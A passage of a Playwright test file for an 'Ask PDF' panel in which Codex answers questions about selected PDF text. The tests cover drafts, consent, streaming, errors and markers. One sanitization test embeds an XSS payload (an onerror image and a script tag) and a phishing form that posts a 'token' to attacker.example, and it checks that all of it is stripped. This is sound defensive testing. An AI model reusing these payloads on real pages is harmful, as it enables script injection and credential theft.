    type: 'pdfDiscussionSnapshot',
    annotations: [persisted],
    consentGranted: true,
    activeAnnotationId: persisted.id,
  });
  await expect(composer).toHaveValue('');
  expect(await page.evaluate(() => window.__mockState.askPdfDraft)).toBe('');
});

test('Ask PDF keeps pending submit state and identical drafts owned by their annotations', async ({ page }) => {
  await openPdf(page);
  const first = annotation({
    id: 'discussion-pending-a',
    selectionKey: 'selection-pending-a',
    messages: [message('question-pending-a', 'user', 'Question A')],
    anchor: { ...baseAnchor(), rects: [[72, 90, 230, 112]] },
  });
  const second = annotation({
    id: 'discussion-pending-b',
    selectionKey: 'selection-pending-b',
    messages: [message('question-pending-b', 'user', 'Question B')],
    anchor: { ...baseAnchor(), rects: [[72, 150, 230, 172]] },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [first, second],
    consentGranted: true,
    activeAnnotationId: first.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  const identicalDraft = 'Explain the same phrase';
  await composer.fill(identicalDraft);
  await page.locator(`.pdf-discussion-marker[data-annotation-id="${second.id}"]`).click();
  await composer.fill(identicalDraft);
  await page.locator(`.pdf-discussion-marker[data-annotation-id="${first.id}"]`).click();
  await composer.press('Control+Enter');
  await expect(composer).toBeDisabled();

  await page.locator(`.pdf-discussion-marker[data-annotation-id="${second.id}"]`).click();
  await expect(composer).toBeEnabled();
  await expect(composer).toHaveValue(identicalDraft);

  const persistedFirst = {
    ...first,
    messages: [...first.messages, message('persisted-pending-a', 'user', identicalDraft)],
    lastTurn: { status: 'idle' },
  };
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [persistedFirst, second],
    consentGranted: true,
    activeAnnotationId: first.id,
  });
  await expect(panel).toContainText('Question B');
  await expect(composer).toBeEnabled();
  await expect(composer).toHaveValue(identicalDraft);
  expect(await page.evaluate(id => (window as any).__mockState.askPdfDrafts[id], second.id)).toBe(identicalDraft);

  await page.locator(`.pdf-discussion-marker[data-annotation-id="${first.id}"]`).click();
  await expect(composer).toBeEnabled();
  await expect(composer).toHaveValue('');
});

test('Ask PDF releases a pending submit after its late error without leaking that error into a newer selection', async ({ page }) => {
  await openPdf(page);
  const existing = annotation();
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [existing],
    consentGranted: true,
    activeAnnotationId: existing.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  await composer.fill('Question from the old selection');
  await composer.press('Control+Enter');
  const staleSubmit = await lastMessage(page, 'pdfDiscussionSubmit');
  await expect(composer).toBeDisabled();

  await page.getByRole('button', { name: 'PDF discussions (1)' }).click();
  await askAbout(page, 'HBM');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: 'selection-newer',
  });
  await expect(composer).toBeEnabled();

  await postHost(page, {
    type: 'pdfDiscussionError',
    requestId: staleSubmit.requestId,
    annotationId: existing.id,
    message: 'Late failure from the old selection',
  });
  await expect(composer).toBeEnabled();
  await expect(panel).not.toContainText('Late failure from the old selection');
});

test('Ask PDF waits for the matching prepare response before submitting a new selection', async ({ page }) => {
  await openPdf(page);
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [], consentGranted: true });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  await composer.fill('Do not race the prepare response.');
  await expect(panel.getByRole('button', { name: 'Send question' })).toBeDisabled();
  await composer.press('Control+Enter');
  expect(await messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(0);

  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: 'selection-delayed-prepare',
  });
  await expect(panel.getByRole('button', { name: 'Send question' })).toBeEnabled();
  await composer.press('Control+Enter');
  expect(await messagesOfType(page, 'pdfDiscussionSubmit')).toHaveLength(1);

  const persisted = annotation({
    selectionKey: 'selection-delayed-prepare',
    messages: [message('delayed-question', 'user', 'Do not race the prepare response.')],
    lastTurn: { status: 'running' },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [persisted],
    consentGranted: true,
    activeAnnotationId: persisted.id,
  });
  await expect(composer).toHaveValue('');
  await expect(composer).toBeDisabled();
});

test('Ask PDF does not acknowledge a repeated question until a new user message is persisted', async ({ page }) => {
  await openPdf(page);
  const existing = annotation({
    messages: [message('old-question', 'user', 'Explain more')],
    lastTurn: { status: 'idle' },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [existing],
    consentGranted: true,
    activeAnnotationId: existing.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const composer = panel.getByPlaceholder('Ask about this selection');
  await composer.fill('Explain more');
  await composer.press('Control+Enter');
  await expect(composer).toHaveValue('Explain more');
  await expect(composer).toBeDisabled();

  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [existing],
    consentGranted: true,
    activeAnnotationId: existing.id,
  });
  await expect(composer).toHaveValue('Explain more');
  await expect(composer).toBeDisabled();

  const persisted = annotation({
    messages: [
      message('old-question', 'user', 'Explain more'),
      message('new-question', 'user', 'Explain more'),
    ],
    lastTurn: { status: 'running' },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [persisted],
    consentGranted: true,
    activeAnnotationId: persisted.id,
  });
  await expect(composer).toHaveValue('');
});

test('Ask PDF withholds retry and promotion until first-use consent is accepted', async ({ page }) => {
  await openPdf(page);
  const failedWithAnswer = annotation({
    messages: [
      message('consent-question', 'user', 'What does this mean?'),
      message('consent-answer', 'assistant', 'It describes tiled attention.'),
    ],
    lastTurn: { status: 'failed', error: 'Follow-up failed' },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [failedWithAnswer],
    consentGranted: false,
    activeAnnotationId: failedWithAnswer.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel.getByRole('button', { name: 'Retry answer' })).toHaveCount(0);
  await expect(panel.getByRole('button', { name: 'Continue in Codex' })).toHaveCount(0);
  await expect(panel.getByPlaceholder('Ask about this selection')).toBeDisabled();

  await panel.getByRole('button', { name: 'Accept and continue' }).click();
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [failedWithAnswer],
    consentGranted: true,
    activeAnnotationId: failedWithAnswer.id,
  });
  await expect(panel.getByRole('button', { name: 'Retry answer' })).toBeEnabled();
  await expect(panel.getByRole('button', { name: 'Continue in Codex' })).toBeEnabled();
});

test('Ask PDF clears only a matching transient action error after the turn resolves', async ({ page }) => {
  await openPdf(page);
  const running = annotation({ lastTurn: { status: 'running' } });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [running],
    consentGranted: true,
    activeAnnotationId: running.id,
  });
  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await panel.getByRole('button', { name: 'Stop response' }).click();
  const cancel = await lastMessage(page, 'pdfDiscussionCancel');
  await postHost(page, {
    type: 'pdfDiscussionError',
    requestId: cancel.requestId,
    annotationId: running.id,
    message: 'This PDF discussion already has an active turn.',
  });
  await expect(panel).toContainText('This PDF discussion already has an active turn.');

  const unrelated = annotation({
    id: 'discussion-unrelated',
    selectionKey: 'selection-unrelated',
    lastTurn: { status: 'idle' },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [running, unrelated],
    consentGranted: true,
    activeAnnotationId: unrelated.id,
  });
  await expect(panel).toContainText('This PDF discussion already has an active turn.');

  const failed = { ...running, lastTurn: { status: 'failed' as const, error: 'Codex disconnected' } };
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [failed],
    consentGranted: true,
    activeAnnotationId: failed.id,
  });
  await expect(panel).toContainText('This PDF discussion already has an active turn.');
  await expect(panel).toContainText('Codex disconnected');

  const cancelled = { ...running, lastTurn: { status: 'cancelled' as const } };
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [cancelled],
    consentGranted: true,
    activeAnnotationId: cancelled.id,
  });
  await expect(panel).not.toContainText('This PDF discussion already has an active turn.');
  await expect(panel).toContainText('Response stopped.');
});

test('Ask PDF manages initial focus, preserves composer selection across streaming renders, and restores PDF focus', async ({ page }) => {
  await openPdf(page);
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, { type: 'pdfDiscussionPrepared', requestId: prepare.requestId, selectionKey: 'selection-focus' });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const accept = panel.getByRole('button', { name: 'Accept and continue' });
  await expect(accept).toBeFocused();
  await accept.click();
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [], consentGranted: true });

  const composer = panel.getByPlaceholder('Ask about this selection');
  await expect(composer).toBeFocused();
  await composer.fill('Preserve this draft');
  await composer.evaluate((textarea: HTMLTextAreaElement) => textarea.setSelectionRange(3, 11));
  await postHost(page, { type: 'pdfDiscussionHighlights', highlights: [] });
  await expect(composer).toBeFocused();
  expect(await composer.evaluate((textarea: HTMLTextAreaElement) => [
    textarea.selectionStart,
    textarea.selectionEnd,
  ])).toEqual([3, 11]);

  await panel.getByRole('button', { name: 'Minimize Ask PDF' }).click();
  await expect(page.locator('#viewer-shell')).toBeFocused();
});

test('Ask PDF preserves draft consent and streams into a durable sanitized answer with routed links', async ({ page }) => {
  await openPdf(page);
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, { type: 'pdfDiscussionPrepared', requestId: prepare.requestId, selectionKey: 'selection-1' });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel).toContainText('Selected text and crop are sent to Codex');
  await expect(panel).toContainText(/cached web search may be used/i);
  await panel.getByRole('button', { name: 'Accept and continue' }).click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionConsent')).toHaveLength(1);
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [], consentGranted: true });

  const composer = panel.getByPlaceholder('Ask about this selection');
  await composer.fill('Why does tiling reduce HBM traffic?');
  await composer.press('Control+Enter');
  const submit = await lastMessage(page, 'pdfDiscussionSubmit');
  expect(submit.question).toBe('Why does tiling reduce HBM traffic?');
  expect(submit.selection).toMatchObject({ page: 1, snippet: 'FlashAttention uses tiling' });
  expect(submit.snapshotPngBase64.length).toBeGreaterThan(32);
  expect(submit.snapshotPadding).toBe(24);
  expect(submit.snapshotCropRect).toHaveLength(4);
  const [cropLeft, cropTop, cropRight, cropBottom] = submit.snapshotCropRect;
  expect(
    submit.snapshotCropRect.every(
      (coordinate: unknown) => typeof coordinate === 'number' && Number.isFinite(coordinate),
    ),
  ).toBe(true);
  expect(cropRight).toBeGreaterThan(cropLeft);
  expect(cropBottom).toBeGreaterThan(cropTop);
  for (const [left, top, right, bottom] of submit.selection.rects) {
    expect(cropLeft).toBeLessThanOrEqual(left);
    expect(cropTop).toBeLessThanOrEqual(top);
    expect(cropRight).toBeGreaterThanOrEqual(right);
    expect(cropBottom).toBeGreaterThanOrEqual(bottom);
  }

  await postHost(page, { type: 'pdfDiscussionTurnState', annotationId: 'discussion-1', status: 'running' });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [annotation({ lastTurn: { status: 'running' } })],
    consentGranted: true,
    activeAnnotationId: 'discussion-1',
  });
  await expect(panel.getByLabel('Codex is responding')).toContainText('Thinking…');
  await postHost(page, { type: 'pdfDiscussionDelta', annotationId: 'discussion-1', delta: '**Tiling** is ' });
  await postHost(page, { type: 'pdfDiscussionDelta', annotationId: 'discussion-1', delta: 'I/O efficient.' });
  await expect(panel.getByLabel('Codex is responding')).toContainText('Tiling is I/O efficient.');
  await expect(panel.getByRole('button', { name: 'Stop response' })).toBeVisible();
  await postHost(page, {
    type: 'pdfDiscussionError',
    requestId: submit.requestId,
    annotationId: 'discussion-1',
    message: 'This PDF discussion already has an active turn.',
  });
  await expect(panel).toContainText('This PDF discussion already has an active turn.');

  const answered = annotation({
    messages: [
      message('question-1', 'user', 'Why does tiling reduce HBM traffic?'),
      message('answer-1', 'assistant', '**Tiling** reuses blocks. [Paper](https://example.com/paper) <img src=x onerror=alert(1)> <script>window.__unsafe = true</script> <form action="https://attacker.example/collect"><label>Token <input name="token" value="secret"></label><textarea name="notes">notes</textarea><select name="mode"><option>send</option></select><button type="submit">Continue</button></form>'),
    ],
  });
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [answered], consentGranted: true, activeAnnotationId: answered.id });
  await expect(panel).not.toContainText('This PDF discussion already has an active turn.');

  await expect(panel.getByText('YOU', { exact: true })).toHaveCount(0);
  await expect(panel.getByText('CODEX', { exact: true })).toHaveCount(0);
  await expect(panel.locator('.ask-pdf-message.user')).toContainText('Why does tiling reduce HBM traffic?');
  await expect(panel.locator('.ask-pdf-message.assistant')).toContainText('Tiling reuses blocks.');
  await expect(panel.locator('strong', { hasText: 'Tiling' })).toBeVisible();
  await expect(panel.locator('script')).toHaveCount(0);
  await expect(panel.locator('img[src="x"]')).toHaveCount(0);
  const answerMarkdown = panel.locator('.ask-pdf-message.assistant .ask-pdf-markdown');
  await expect(answerMarkdown.locator('form, input, textarea, select, option, button')).toHaveCount(0);
  expect(await page.evaluate(() => (window as any).__unsafe)).toBeUndefined();

  const paperLink = panel.getByRole('link', { name: 'Paper' });
  await paperLink.click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionOpenLink')).toEqual([
    expect.objectContaining({ href: 'https://example.com/paper' }),
  ]);
  await page.evaluate(() => { window.__mockMessages = []; });
  await expect(paperLink).toHaveAttribute('href', '#');
  await paperLink.dispatchEvent('auxclick', { button: 1 });
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionOpenLink')).toEqual([
    expect.objectContaining({ href: 'https://example.com/paper' }),
  ]);

  await page.evaluate(() => { window.__mockMessages = []; });
  await composer.fill('What should I read next?');
  const send = panel.getByRole('button', { name: 'Send question' });
  await expect(send).toBeEnabled();
  await send.click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionSubmit')).toEqual([
    expect.objectContaining({ annotationId: answered.id, question: 'What should I read next?' }),
  ]);
});

test('Ask PDF announces only each new stream delta while keeping the visible response cumulative', async ({ page }) => {
  await openPdf(page);
  const running = annotation({ lastTurn: { status: 'running' } });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [running],
    consentGranted: true,
    activeAnnotationId: running.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const liveRegion = panel.getByRole('status', { name: 'Codex response updates' });
  await expect(liveRegion).toHaveCount(1);
  expect(await liveRegion.evaluate(element => element.closest('.ask-pdf-content'))).toBeNull();
  await liveRegion.evaluate(element => { (element as HTMLElement).dataset.identity = 'persistent'; });

  await postHost(page, { type: 'pdfDiscussionDelta', annotationId: running.id, delta: 'First delta. ' });
  await expect(liveRegion).toHaveText('First delta. ');
  await expect(panel.getByLabel('Codex is responding')).toContainText('First delta.');

  await postHost(page, { type: 'pdfDiscussionDelta', annotationId: running.id, delta: 'Second delta.' });
  await expect(liveRegion).toHaveText('Second delta.');
  await expect(liveRegion).toHaveAttribute('data-identity', 'persistent');
  await expect(panel.getByLabel('Codex is responding')).toContainText('First delta. Second delta.');
});

test('Ask PDF announces stream deltas only for the active discussion', async ({ page }) => {
  await openPdf(page);
  const active = annotation({
    id: 'discussion-active',
    selectionKey: 'selection-active',
    lastTurn: { status: 'running' },
  });
  const background = annotation({
    id: 'discussion-background',
    selectionKey: 'selection-background',
    lastTurn: { status: 'running' },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [active, background],
    consentGranted: true,
    activeAnnotationId: active.id,
  });

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  const liveRegion = panel.getByRole('status', { name: 'Codex response updates' });
  await postHost(page, {
    type: 'pdfDiscussionDelta',
    annotationId: background.id,
    delta: 'Background answer must stay silent.',
  });
  await expect(liveRegion).toBeEmpty();
  await expect(panel).not.toContainText('Background answer must stay silent.');

  await postHost(page, {
    type: 'pdfDiscussionDelta',
    annotationId: active.id,
    delta: 'Active answer is announced.',
  });
  await expect(liveRegion).toHaveText('Active answer is announced.');
  await expect(panel.getByLabel('Codex is responding')).toContainText('Active answer is announced.');
});

test('Ask PDF keeps the newer selection active across stale responses and background annotation updates', async ({ page }) => {
  await openPdf(page);
  const first = annotation({
    id: 'discussion-a',
    selectionKey: 'selection-a',
    anchor: { ...baseAnchor(), quote: 'FlashAttention uses tiling' },
    messages: [message('q-a', 'user', 'Question A'), message('a-a', 'assistant', 'Answer A')],
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [first],
    consentGranted: true,
    activeAnnotationId: first.id,
  });

  await askAbout(page, 'HBM');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: 'selection-b',
  });

  const second = annotation({
    id: 'discussion-b',
    selectionKey: 'selection-b',
    anchor: { ...baseAnchor(), quote: 'HBM' },
    messages: [message('q-b', 'user', 'Question B')],
    lastTurn: { status: 'running' },
  });
  await postHost(page, { type: 'pdfDiscussionDelta', annotationId: second.id, delta: 'Partial B' });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [first, second],
    consentGranted: true,
  });
  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel).toContainText('Question B');
  await expect(panel).toContainText('Partial B');

  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [{ ...first, updatedAt: '2026-07-15T12:30:00.000Z' }, second],
    consentGranted: true,
    activeAnnotationId: first.id,
  });
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: 'ask-pdf-stale-prepare',
    selectionKey: first.selectionKey,
    annotation: first,
  });
  await postHost(page, {
    type: 'pdfDiscussionError',
    requestId: 'ask-pdf-stale-error',
    annotationId: first.id,
    message: 'Stale A failure',
  });

  await expect(panel).toContainText('Question B');
  await expect(panel).toContainText('Partial B');
  await expect(panel).not.toContainText('Question A');
  await expect(panel).not.toContainText('Stale A failure');
});

test('Ask PDF markers, count, overview, retry, promotion, minimize, and Stop use the typed host protocol', async ({ page }) => {
  await openPdf(page);
  const failed = annotation({
    id: 'discussion-failed',
    updatedAt: '2026-07-15T12:10:00.000Z',
    lastTurn: { status: 'failed', error: 'Codex disconnected' },
    messages: [message('q-failed', 'user', 'Failed question')],
    anchor: { ...baseAnchor(), rects: [[80, 110, 190, 130]] },
  });
  const running = annotation({
    id: 'discussion-running',
    updatedAt: '2026-07-15T12:00:00.000Z',
    lastTurn: { status: 'running' },
    messages: [message('q-running', 'user', 'Running question')],
    anchor: { ...baseAnchor(), rects: [[80, 145, 200, 165]] },
  });
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [failed, running], consentGranted: true, activeAnnotationId: failed.id });

  const count = page.getByRole('button', { name: 'PDF discussions (2)' });
  await expect(count).toContainText('✦ 2');
  await expect(page.locator('.pdf-discussion-marker')).toHaveCount(2);
  await expect(page.locator('.pdf-discussion-marker .number')).toHaveText(['1', '2']);
  await expect(page.locator('.pdf-discussion-marker.failed')).toHaveCount(1);
  await expect(page.locator('.pdf-discussion-marker.running')).toHaveCount(1);

  await count.click();
  const overview = page.getByRole('region', { name: 'PDF discussion overview' });
  await expect(overview.getByRole('button')).toHaveText([/Failed question/, /Running question/]);
  await overview.getByRole('button').first().click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionOpen')).toContainEqual(
    expect.objectContaining({ annotationId: failed.id }),
  );
  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await panel.getByRole('button', { name: 'Retry answer' }).click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionRetry')).toContainEqual(
    expect.objectContaining({ annotationId: failed.id }),
  );

  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [{ ...failed, lastTurn: { status: 'running' } }, running], consentGranted: true, activeAnnotationId: failed.id });
  await page.evaluate(() => { window.__mockMessages = []; });
  await panel.getByRole('button', { name: 'Minimize Ask PDF' }).click();
  await expect(panel).toBeHidden();
  expect(await messagesOfType(page, 'pdfDiscussionCancel')).toHaveLength(0);
  await page.locator('.pdf-discussion-marker').first().click();
  await panel.getByRole('button', { name: 'Stop response' }).click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionCancel')).toContainEqual(
    expect.objectContaining({ annotationId: failed.id }),
  );

  const promoted = { ...failed, lastTurn: { status: 'idle' as const }, messages: [...failed.messages, message('a', 'assistant', 'Answer')] };
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [promoted], consentGranted: true, activeAnnotationId: promoted.id });
  await panel.getByRole('button', { name: 'Continue in Codex' }).click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionPromote')).toContainEqual(
    expect.objectContaining({ annotationId: promoted.id }),
  );
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [{ ...promoted, promotion: { threadId: 'thread/abc', promotedAt: '2026-07-15T12:20:00.000Z' } }],
    consentGranted: true,
    activeAnnotationId: promoted.id,
  });
  await panel.getByRole('button', { name: 'Open Codex task' }).click();
  await postHost(page, { type: 'pdfDiscussionPromotionState', annotationId: promoted.id, threadId: 'thread/abc', opened: false, error: 'Deep link unavailable' });
  await expect(panel.getByRole('button', { name: 'Retry opening' })).toBeVisible();
  await expect(panel.getByRole('button', { name: 'Copy task ID' })).toBeVisible();
});

test('Ask PDF keeps one keyboard marker for a multi-band portable discussion anchor', async ({ page }) => {
  await openPdf(page);
  const rects = [[72, 90, 230, 112], [72, 114, 205, 132]];
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [annotation({ anchor: { ...baseAnchor(), rects } })],
    consentGranted: true,
    activeAnnotationId: 'discussion-1',
  });

  const outlines = page.locator('.pdf-discussion-outline');
  const marker = page.locator('.pdf-discussion-marker');
  await expect(outlines).toHaveCount(2);
  await expect(marker).toHaveCount(1);
  expect(await outlines.evaluateAll(elements => elements.every(element => (element as HTMLElement).tabIndex === -1))).toBe(true);
  expect(await outlines.evaluateAll(elements => elements.every(element => getComputedStyle(element).pointerEvents === 'none'))).toBe(true);
  expect(await marker.evaluate((element: HTMLElement) => element.tabIndex)).toBe(0);
  await expect(page.locator('.annotation-highlight')).toHaveCount(0);
});

test('Ask PDF persists mixed-style selection as the same two fill-only visual bands', async ({ page }) => {
  await openPdf(page, 'mixed-style-selection');
  await selectAcrossTextItems(
    page,
    'Normal text before',
    'Tightly spaced normal second line.',
  );
  const selectionBands = await page.locator('#page-1 .pdf-selection-rect').evaluateAll(elements => elements
    .map(element => {
      const rect = element.getBoundingClientRect();
      return { x: rect.x, y: rect.y, width: rect.width, height: rect.height };
    })
    .sort((left, right) => left.y - right.y || left.x - right.x));
  expect(selectionBands).toHaveLength(2);

  await openSelectionContextMenu(page);
  await page.getByRole('menuitem', { name: 'Ask about selection…', exact: true }).click();
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  expect(prepare.selection.rects).toHaveLength(2);
  const persisted = annotation({
    id: 'discussion-mixed-style-bands',
    selectionKey: 'selection-mixed-style-bands',
    anchor: {
      ...baseAnchor(),
      quote: prepare.selection.snippet,
      rects: prepare.selection.rects,
    },
  });
  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [persisted],
    consentGranted: true,
    activeAnnotationId: persisted.id,
  });

  const discussionBands = page.locator('.pdf-discussion-outline');
  await expect(discussionBands).toHaveCount(2);
  const persistedBands = await discussionBands.evaluateAll(elements => elements
    .map(element => {
      const rect = element.getBoundingClientRect();
      const style = getComputedStyle(element);
      return {
        box: { x: rect.x, y: rect.y, width: rect.width, height: rect.height },
        backgroundColor: style.backgroundColor,
        borderTopStyle: style.borderTopStyle,
        borderTopWidth: style.borderTopWidth,
        outlineStyle: style.outlineStyle,
      };
    })
    .sort((left, right) => left.box.y - right.box.y || left.box.x - right.box.x));

  persistedBands.forEach((band, index) => {
    expectBoxNear(band.box, selectionBands[index]);
    expect(band.borderTopStyle).toBe('none');
    expect(band.borderTopWidth).toBe('0px');
    expect(band.outlineStyle).toBe('none');
    expect(cssAlpha(band.backgroundColor)).toBeGreaterThan(0);
  });
});

test('Ask PDF restores persisted crop lazily and initializes durable floating state', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 820 });
  await openPdf(page);
  const answered = annotation({
    snapshot: { sha256: 'abc', width: 420, height: 180, mimeType: 'image/png' },
    messages: [message('q', 'user', 'Persisted question'), message('a', 'assistant', 'Persisted answer')],
  });
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [answered], consentGranted: true, activeAnnotationId: answered.id });
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionLoadSnapshot')).toContainEqual(
    expect.objectContaining({ annotationId: answered.id }),
  );
  const dataUrl = await page.locator('#page-1 .pdf-canvas').evaluate((canvas: HTMLCanvasElement) => canvas.toDataURL('image/png'));
  await postHost(page, { type: 'pdfDiscussionSnapshotImage', annotationId: answered.id, snapshotPngBase64: dataUrl.split(',')[1] });
  await page.getByRole('complementary', { name: 'Ask about selection' }).locator('details[data-ask-source] summary').click();
  await expect(page.locator('img.ask-pdf-crop')).toBeVisible();

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel).toHaveCSS('width', '380px');
  await expect(panel).toHaveCSS('height', '520px');
  const resizer = panel.locator('.ask-pdf-resizer');
  await expect(resizer).toHaveAttribute('aria-valuemin', '320');
  await expect(resizer).toHaveAttribute('aria-valuemax', '560');
  await expect(resizer).toHaveAttribute('aria-valuenow', '380');
  expect(await page.evaluate(id => (window as any).__mockState.askPdfWindows?.[id], answered.id)).toMatchObject({
    width: 380,
    height: 520,
    detached: false,
    minimized: false,
  });
});

test('Ask PDF treats a missing persisted crop as a text-only acknowledgement without retrying it', async ({ page }) => {
  await openPdf(page);
  await askAbout(page, 'FlashAttention uses tiling');
  const prepare = await lastMessage(page, 'pdfDiscussionPrepare');
  const withMissingCrop = annotation({
    selectionKey: 'selection-missing-crop',
    snapshot: { sha256: 'missing', width: 420, height: 180, mimeType: 'image/png' },
  });
  await postHost(page, {
    type: 'pdfDiscussionPrepared',
    requestId: prepare.requestId,
    selectionKey: withMissingCrop.selectionKey,
    annotation: withMissingCrop,
  });
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionLoadSnapshot')).toHaveLength(1);

  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await panel.locator('details[data-ask-source] summary').click();
  await expect(panel.locator('img.ask-pdf-crop')).toBeVisible();
  await postHost(page, { type: 'pdfDiscussionSnapshotImage', annotationId: withMissingCrop.id });
  await expect(panel.locator('img.ask-pdf-crop')).toHaveCount(0);
  await expect(panel).toContainText('The page crop is unavailable, so Ask PDF will use text-only context.');

  await postHost(page, {
    type: 'pdfDiscussionSnapshot',
    annotations: [withMissingCrop],
    consentGranted: false,
    activeAnnotationId: withMissingCrop.id,
  });
  await page.getByRole('button', { name: 'PDF discussions (1)' }).click();
  await page.getByRole('region', { name: 'PDF discussion overview' }).getByRole('button').click();
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionLoadSnapshot')).toHaveLength(1);
  await expect(panel.locator('img.ask-pdf-crop')).toHaveCount(0);
});

test('Ask PDF answered desktop and narrow overlay retain stable Codex-quiet visuals', async ({ page }) => {
  await page.setViewportSize({ width: 1280, height: 820 });
  await openPdf(page);
  const answered = annotation({
    messages: [
      message('q', 'user', 'Why does the paper tile attention?'),
      { ...message('a', 'assistant', 'Tiling keeps working blocks close to compute, reducing repeated **HBM traffic**.'), codexModel: 'gpt-5.4' },
    ],
    lastTurn: { status: 'idle', model: 'gpt-5.4' },
  });
  await postHost(page, { type: 'pdfDiscussionSnapshot', annotations: [answered], consentGranted: true, activeAnnotationId: answered.id });
  await expect.poll(() => messagesOfType(page, 'pdfDiscussionListModels')).toHaveLength(1);
  await postHost(page, {
    type: 'pdfDiscussionModels',
    models: [
      { id: 'default', model: 'gpt-5.4', displayName: 'GPT-5.4', description: 'Default model', isDefault: true },
      { id: 'fast', model: 'gpt-5.4-mini', displayName: 'GPT-5.4 Mini', description: 'Fast model', isDefault: false },
    ],
  });
  const panel = page.getByRole('complementary', { name: 'Ask about selection' });
  await expect(panel).toContainText('Why does the paper tile attention?');
  await expect(panel).toContainText('reducing repeated HBM traffic');
  if (process.platform === 'darwin') {
    await expect(panel).toHaveScreenshot('ask-pdf-answered-desktop.png');
  }

  await page.setViewportSize({ width: 600, height: 820 });
  await expect(panel).toBeVisible();
  await expect(panel).toContainText('GPT-5.4');
  if (process.platform === 'darwin') {
    await expect(panel).toHaveScreenshot('ask-pdf-answered-narrow.png');
  }
});

async function openPdf(page: Page, fixture = 'flash-attention'): Promise<void> {
  await page.goto(`${PDF_URL}?fixture=${fixture}&askPdf=1`);
  const expected = fixture === 'two-page' ? /Page 1 \/ 2/ : /Page 1 \/ 1/;
  await expect(page.locator('#page-info')).toHaveText(expected, { timeout: 10_000 });
  await expect(page.locator('.text-layer span[data-item-index]').first()).toBeVisible();
  await page.evaluate(() => { window.__mockMessages = []; });
}

async function selectText(page: Page, quote: string): Promise<void> {
  await page.evaluate((selectedText) => {
    const span = Array.from(document.querySelectorAll<HTMLElement>('.text-layer span[data-item-index]'))
      .find(candidate => candidate.textContent?.includes(selectedText));
